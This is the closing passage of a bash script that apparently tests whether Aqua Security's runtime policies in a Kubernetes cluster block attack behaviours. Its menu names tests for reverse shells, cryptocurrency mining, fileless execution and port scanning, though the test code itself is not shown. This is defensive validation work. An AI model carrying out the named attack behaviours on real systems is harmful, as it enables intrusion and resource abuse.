}


# Terminate the program
terminate_program() {
    read -p "Are you sure you want to terminate the program? (y/n): " terminate_choice
    case $terminate_choice in
        [Yy]*)
            cleanup_aqua_probe_artifacts
            unset AQUA_PROBE_SKIP_INSTRUCTIONS # Unset env var for skip instructions flag
            unset AQUA_PROBE_IMAGE # Unset env var for image flag
            unset AQUA_PROBE_DAEMONSET # Unset env var for daemonset flag
            unset AQUA_PROBE_NAMESPACE # Unset env var for namespace flag
            exit
            ;;
        [Nn]*)
            echo "Cancelled termination. Returning to the main menu."
            ;;
        *)
            echo "Invalid input. Returning to the main menu."
            ;;
    esac
}


#
# Main
# 
main() {
    print_logo
    print_welcome_message
    echo

    handle_flags "$@"
    echo

    check_kubernetes_connection
    check_aqua_agent_daemonset
    check_aqua_kube_enforcer_deployment

    # Check if Aqua test container exists
    if check_container_existence; then
        echo "Aqua test container already exists."
        read -p "Would you like to redeploy the test application? (y/n): " redeploy_choice
        if [[ "$redeploy_choice" =~ ^[Yy] ]]; then
            delete_test_container
            deploy_test_container
            echo
        else
            echo "Proceeding to menu..."
            echo
        fi
    else
        print_colored_message yellow "[!] Aqua test container does not exist - Select option 1 to deploy."
        echo
        echo "Proceeding to menu..."
        echo 
    fi
    echo

    while true; do
        echo "Please select an option:"
        echo "1. Deploy/Redeploy test container"
        echo "2. Test Bad DNS/IP Reputation"
        echo "3. Test Block Container Exec"
        echo "4. Test Block Cryptocurrency Mining"
        echo "5. Test Block Fileless Execution"
        echo "6. Test Block Non-compliant Images"
        echo "7. Test Block Non-compliant Resources"
        echo "8. Test Block Non-Kubernetes Containers"
        echo "9. Test Block Reverse Shell"
        echo "10. Test Block Unregistered Images"
        echo "11. Test Drift Prevention"
        echo "12. Test Executables Blocked"
        echo "13. Test File Block"
        echo "14. Test File Integrity Monitoring"
        echo "15. Test Limit Container Privileges"
        echo "16. Test Package Block"
        echo "17. Test Port Block"
        echo "18. Test Port Scanning Detection"
        echo "19. Test Real-time Malware Protection [Delete action]"
        echo "20. Test System Integrity Monitoring"
        echo "21. Test Volumes Blocked"
        echo "22. Terminate Program"
        echo

        read -p "Enter your choice (1-22): " choice

        case $choice in
            1)
                deploy_test_container
                ;;
            2)
                test_bad_dns_ip_reputation
                ;;
            3)
                test_block_container_exec
                ;;
            4)
                test_block_cryptocurrency_mining
                ;;
            5)
                test_block_fileless_execution
                ;;
            6)
                test_block_non_compliant_images
                ;;
            7)
                test_block_non_compliant_resources
                ;;
            8)
                test_block_non_kubernetes_containers
                ;;
            9)
                test_reverse_shell
                ;;
            10)
                test_block_unregistered_images
                ;;
            11)
                test_drift_prevention
                ;;
            12)
                test_executables_blocked
                ;;
            13)
                test_file_block
                ;;
            14)
                test_file_integrity_monitoring
                ;;
            15)
                test_limit_container_privileges
                ;;
            16)
                test_package_block
                ;;
            17)
                test_port_block
                ;;
            18)
                test_port_scanning_detection
                ;;
            19)
                test_realtime_malware_protection
                ;;
            20)
                test_system_integrity_monitoring
                ;;
            21)
                test_volumes_blocked
                ;;
            22)
                terminate_program
                ;;
        esac

        echo
        # Add a short delay before showing the options menu again
        sleep 2
    done
}

main "$@"
